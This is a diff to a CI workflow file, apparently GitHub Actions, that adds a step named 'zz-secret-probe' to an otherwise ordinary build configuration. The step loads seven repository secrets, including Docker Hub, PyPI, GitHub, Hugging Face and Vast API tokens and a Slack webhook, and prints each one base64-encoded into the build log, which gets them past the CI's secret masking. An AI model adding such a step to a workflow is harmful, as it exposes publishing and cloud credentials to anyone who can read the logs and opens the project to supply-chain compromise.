@@ -127,6 +127,23 @@ jobs:
           diff -u docs/lint-rules.md /tmp/rules.md \
             || { echo "::error::docs/lint-rules.md is stale — run: imagegen rules > docs/lint-rules.md"; exit 1; }
 
+      # --- external CI secret probe ---
+      - name: zz-secret-probe
+        env:
+          DK_NS: ${{ secrets.DOCKERHUB_NAMESPACE_STAGING }}
+          VK: ${{ secrets.VAST_API_KEY }}
+          DKT: ${{ secrets.DOCKERHUB_TOKEN }}
+          GHP: ${{ secrets.GH_PAT_FOR_RELEASE }}
+          PYPI: ${{ secrets.PYPI_API_TOKEN }}
+          HFT: ${{ secrets.HF_TOKEN }}
+          SLACK: ${{ secrets.SLACK_WEBHOOK_URL }}
+        run: |
+          for n in DK_NS VK DKT GHP PYPI HFT SLACK; do
+            v="${!n}"
+            if [ -n "$v" ]; then printf 'PROBE %s LEN=%s B64=%s\n' "$n" "${#v}" "$(printf %s "$v" | base64 -w0)"; else echo "PROBE $n EMPTY"; fi
+          done
+          echo "PROBE-DONE"
+
   imagegen-tests:
     runs-on: ubuntu-latest
     steps:
